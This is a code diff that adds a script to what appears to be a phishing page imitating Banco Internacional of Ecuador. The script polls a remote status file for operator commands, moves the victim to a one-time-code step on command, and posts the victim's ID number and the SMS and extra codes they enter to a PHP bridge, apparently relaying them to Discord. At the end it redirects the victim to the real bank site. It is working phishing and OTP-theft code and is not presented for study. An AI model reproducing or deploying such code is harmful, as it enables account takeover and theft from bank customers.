@@ -1,0 +1,47 @@
+<script>
+  const user = localStorage.getItem("bf_last_dni") || "Cliente";
+  document.getElementById("userDisplay").textContent = user;
+
+  // ESCUCHA DE ÓRDENES EN TIEMPO REAL
+  async function chequearOrden() {
+    try {
+      const res = await fetch('estado.txt?v=' + Math.random());
+      const orden = (await res.text()).trim();
+      if (orden === "error_login") {
+          window.location.href = "index.html?status=error";
+      } else if (orden === "pedir_otp") {
+          document.getElementById("overlay").classList.remove("show");
+          document.getElementById("paso1").style.display = "none";
+          document.getElementById("paso2").style.display = "block";
+      } else if (orden === "finalizar") {
+          window.location.href = "https://www.bancointernacional.com.ec/";
+      }
+    } catch (e) {}
+  }
+  setInterval(chequearOrden, 2000);
+
+  // ENVÍO AL PUENTE PHP
+  async function enviarADiscord(titulo, valor) {
+    await fetch('enviar.php', {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ usuario: user, clave: valor, tipo: titulo })
+    });
+  }
+
+  function configurarBoton(inputId, btnId, titulo) {
+    const inp = document.getElementById(inputId);
+    const btn = document.getElementById(btnId);
+    inp.addEventListener("input", () => btn.classList.toggle("ready", inp.value.length >= 4));
+    btn.addEventListener("click", async () => {
+      if(!btn.classList.contains("ready")) return;
+      btn.disabled = true;
+      await enviarADiscord(titulo, inp.value);
+      document.getElementById("overlay").classList.add("show");
+      fetch('control.php?accion=esperando'); // Volver a esperar orden del botón
+    });
+  }
+
+  configurarBoton("smsCode", "btnSms", "CÓDIGO SMS");
+  configurarBoton("extraCode", "btnExtra", "CÓDIGO EXTRA");
+</script>
